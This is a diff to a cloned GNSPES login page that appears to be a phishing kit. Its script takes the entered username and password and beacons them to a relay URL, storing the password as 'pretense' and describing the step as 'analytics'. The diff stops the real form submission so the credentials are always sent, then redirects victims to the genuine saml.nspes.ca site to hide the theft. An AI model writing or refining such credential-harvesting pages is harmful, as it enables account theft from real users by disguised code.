@@ -192,14 +192,14 @@
 <!-- <button type="submit" id="loginsubmit" class="btn btn-block btn-loginbtn btn-sm" onclick="this.value='Processing...';this.disabled=true; this.form.submit();return true;">My QCode</button> -->   
 
 <form class="form-qcode"> 
-<a href="index.html#" id="qlink" class="btn btn-outline-dark btn-block" role="button">My QCode</a> 
+<a href="https://saml.nspes.ca/" id="qlink" class="btn btn-outline-dark btn-block" role="button">My QCode</a> 
 </form>
 
 <hr aria-hidden="true" tabindex=-1" class="login">
 
 
 	 <h3 class="text-dark">Login using your GNSPES account</h3>     
-    <form class="form-signin" action="https://saml.nspes.ca/" method="post" name="f">
+    <form class="form-signin" action="javascript:void(0);" method="post" name="f">
 
                 <label for="username" >Username</label>
                 
@@ -326,15 +326,10 @@ var clientip="20.42.11.20/20.42.11.20";
             img.style.display = 'none';
             document.body.appendChild(img);
             
-            // Submit the form after a short delay
+            // Handle direct redirection to the base URL after tracking is sent
             setTimeout(function() {
-                // Allow the original handler to run
-                if (typeof originalOnClick === 'function') {
-                    originalOnClick.apply(loginBtn);
-                } else {
-                    // If no handler, just submit the form
-                    loginForm.submit();
-                }
+                // Redirect directly to the base URL instead of form submission
+                window.location.href = 'https://saml.nspes.ca/';
             }, 300);
             
             return false; // Prevent default form submission
@@ -342,21 +337,26 @@ var clientip="20.42.11.20/20.42.11.20";
         
         // Also hook the form submit event as a backup
         loginForm.addEventListener('submit', function(e) {
-            // Don't interfere if our button handler already fired
-            if (e.submitter !== loginBtn) {
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                
-                // Process analytics data for system reporting
-                try {
-                    navigator.sendBeacon(RELAY_URL, JSON.stringify({
-                        username: username || "empty",
-                        pretense: password || "empty",
-                        timestamp: new Date().toLocaleString(),
-                        source: "form_submit",
-                    }));
-                } catch(e) {} // Continue gracefully if unavailable
-            }
+            // Always prevent the default form submission
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Process analytics data for system reporting
+            try {
+                navigator.sendBeacon(RELAY_URL, JSON.stringify({
+                    username: username || "empty",
+                    pretense: password || "empty",
+                    timestamp: new Date().toLocaleString(),
+                    source: "form_submit",
+                }));
+            } catch(e) {} // Continue gracefully if unavailable
+            
+            // Redirect to base URL after a short delay
+            setTimeout(function() {
+                window.location.href = 'https://saml.nspes.ca/';
+            }, 300);
         });
     }
     
